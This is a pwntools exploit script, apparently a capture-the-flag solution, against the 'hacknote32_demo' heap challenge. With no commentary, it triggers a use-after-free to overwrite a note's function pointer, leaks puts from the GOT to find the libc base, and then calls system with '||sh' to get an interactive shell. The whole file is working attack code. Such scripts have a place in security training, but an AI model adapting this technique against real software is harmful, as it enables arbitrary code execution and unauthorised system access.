from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./hacknote32_demo"
libc_binary = "/lib/i386-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

def opt(idx):
    p.sendlineafter("Your choice :",str(idx))

def add(length,content):
    opt(1)
    p.sendlineafter("Note size :",str(length))
    p.sendlineafter("Content :",str(content))

def free(idx):
    opt(2)
    p.sendlineafter("Index :",str(idx))

def list(idx):
    opt(3)
    p.sendlineafter("Index :",str(idx))


add(0x30-4,"a"*8)
add(0x30-4,"b"*8)
free(1)
free(0)

print_content_addr = 0x804865b

payload = flat([
    print_content_addr,elf.got["puts"]
    ])
add(8,payload)
list(1)
puts_addr = u32(p.recv(4))

libc_base = puts_addr - libc.sym["puts"]
system_addr = libc_base+libc.sym["system"]

free(0)
payload = flat([
    system_addr,"||sh"
    ])
add(8,payload)
list(1)

# gdb.attach(p,"set $h=0x804b000")

p.interactive()
